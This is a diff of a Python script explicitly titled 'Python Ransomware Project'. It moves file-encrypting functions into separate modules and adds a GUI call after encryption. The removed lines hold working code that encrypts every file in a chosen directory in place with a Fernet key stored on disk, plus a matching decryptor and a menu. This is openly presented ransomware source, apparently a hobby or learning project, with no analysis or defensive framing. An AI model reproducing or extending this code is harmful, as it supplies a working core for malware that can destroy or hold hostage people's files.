@@ -1,61 +1,26 @@
 import os #to interact with file system
 import ctypes #windows api features
 from cryptography.fernet import Fernet #key generation and encryption
+from encrypt import encrypt
+from decrypt import decrypt
+from gui import gui
+
 def keygen():
     key = Fernet.generate_key() #generates fernet key
 
     with open('encryptionkey.key', 'wb') as file:
         file.write(key) #writes fernet key to file
+
+
 def file_list(directory):
     files = os.scandir(directory)
     #for testing, just list names of the files
     print("The following files are in this directory: ")
     for entry in files:
         if entry.is_file():
-            print(entry.name)
-def encrypt(directory):
-    print("This will ENCRYPT the files listed above, potentially causing file loss. Are you sure you wish to continue?")
-    option = input("Select (y/n): ")
-    with open('encryptionkey.key', 'rb') as key:
-        encrypt = key.read().strip()
-        fernet = Fernet(encrypt)
-    match option:
-        case 'y':
-            print("Encrypting...")
-            #grab all files from a directory and encrypt. 
-            files= os.scandir(directory)
-            for entry in files:
-                if entry.is_file:
-                    if entry.name == "desktop.ini":
-                        print("Desktop.ini detected, skipping file...")
-                    else:
-                        with open(entry, 'rb') as f:
-                            data = f.read()
-                            encrypted_file = fernet.encrypt(data)
-                        with open(entry, 'wb') as ef:
-                            ef.write(encrypted_file)
-            print("Encryption complete.")
-        case 'n':
-            print("Encryption Cancelled.")
-
-#maybe make the decryptor a separate program?
-def decrypt(directory):
-    #finds key.txt
-    with open('encryptionkey.key', 'rb') as decrypt:
-        key = decrypt.read().strip()
-        fernet = Fernet(key)
-
-    files = os.scandir(directory)
-    for entry in files:
-        if entry.is_file:
             if entry.name == "desktop.ini":
-                print("Desktop.ini detected, skipping file...")
-            with open(entry, 'rb') as f:
-                data = f.read()
-            decrypted = fernet.decrypt(data)
-            with open(entry, 'wb' ) as f:
-                f.write(decrypted)
-            
+                continue
+            print(entry.name)
 
 #for cmd line, make a selection menu? 
 print("Python Ransomware Project")
@@ -71,6 +36,7 @@ match option:
         path = input("directory: ")
         file_list(path)
         encrypt(path)
+        gui()
     case '2': #decryption case
         path=input("directory: ")
         decrypt(path)
